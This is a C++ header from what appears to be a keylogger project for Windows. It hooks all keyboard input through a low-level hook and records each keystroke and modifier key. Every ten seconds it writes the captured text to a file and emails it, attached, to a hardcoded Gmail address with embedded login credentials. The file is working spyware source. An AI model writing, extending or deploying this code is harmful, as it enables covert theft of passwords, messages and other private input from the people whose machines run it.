#pragma once

#include <chrono>
#include <fstream>
#include <iostream>
#include <memory>
#include <thread>

#include "DefaultFileSystemAccess.h"
#include "Helper.h"
#include "KeyBinding.h"
#include "KeyloggerDirectoryLocator.h"
#include "MailSender.h"
#include "PowerShellMailSender.h"
#include "UserInputFileLogger.h"
#include "windows.h"

namespace keylogger
{
using namespace std::chrono_literals;

class KeyboardHook
{
public:
    KeyboardHook(std::unique_ptr<mail::MailSender> mailSenderInit,
                 std::unique_ptr<UserInputFileLogger> userInputFileLoggerInit)
        : mailThread{&KeyboardHook::timerSendMail, this},
          mailSender{std::move(mailSenderInit)},
          userInputFileLogger{std::move(userInputFileLoggerInit)}
    {
    }

    ~KeyboardHook()
    {
        if (mailThread.joinable())
        {
            mailThread.join();
        }
    }

    [[noreturn]] void timerSendMail()
    {
        while (true)
        {
            std::this_thread::sleep_for(std::chrono::seconds(10s));
            utils::appendLog("triggered sending email, keylog: " + keylog);

            if (keylog.empty())
            {
                continue;
            }

            std::string lastFile = userInputFileLogger->writeLogToNewlyCreatedFileBasedOnCurrentTime(keylog);

            if (lastFile.empty())
            {
                utils::appendLog("File creation was not succesfull. Keylog: " + keylog);
                continue;
            }

            keylogger::mail::Mail mail{"michalovskyyy@gmail.com", "michalovskyyy@gmail.com",
                                       "[" + lastFile + "]",
                                       "Logs from user: " + keylog,
                                       KeyloggerDirectoryLocator::getAppDataKeyloggerPath(true) + lastFile};
            keylogger::mail::Credentials credentials{"michalovskyyy@gmail.com", "xxx"};

            if (mailSender->sendMail(mail, credentials))
            {
                keylog = "";
            }
        }
    }

    static LRESULT processKeyboard(int nCode, WPARAM wparam, LPARAM lparam)
    {
        if (nCode < 0)
        {
            CallNextHookEx(eHook, nCode, wparam, lparam);
        }

        KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lparam;
        if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
        {
            utils::appendLog("key down");
            keylog += Keys::keys[kbs->vkCode].name;
            if (kbs->vkCode == VK_RETURN)
            {
                keylog += "\n";
            }
        }
        else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
        {
            utils::appendLog("key up");
            DWORD key = kbs->vkCode;
            if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL || key == VK_SHIFT ||
                key == VK_LSHIFT || key == VK_RSHIFT || key == VK_MENU || key == VK_LMENU ||
                key == VK_RMENU || key == VK_CAPITAL || key == VK_NUMLOCK || key == VK_LWIN || key == VK_RWIN)
            {
                std::string keyName = Keys::keys[kbs->vkCode].name;
                keyName.insert(1, "/");
                keylog += keyName;
            }
        }

        return CallNextHookEx(eHook, nCode, wparam, lparam);
    }

    bool installHook()
    {
        utils::appendLog("Hook started...");

        eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardHook::processKeyboard,
                                 GetModuleHandle(NULL), 0);

        return eHook == NULL;
    }

    bool uninstallHook()
    {
        BOOL b = UnhookWindowsHookEx(eHook);
        eHook = NULL;
        mailThread.join();
        return static_cast<bool>(b);
    }

private:
    static std::string keylog;
    static HHOOK eHook;
    std::thread mailThread;
    std::unique_ptr<mail::MailSender> mailSender;
    std::unique_ptr<UserInputFileLogger> userInputFileLogger;
};

HHOOK KeyboardHook::eHook = NULL;
std::string KeyboardHook::keylog = "";
}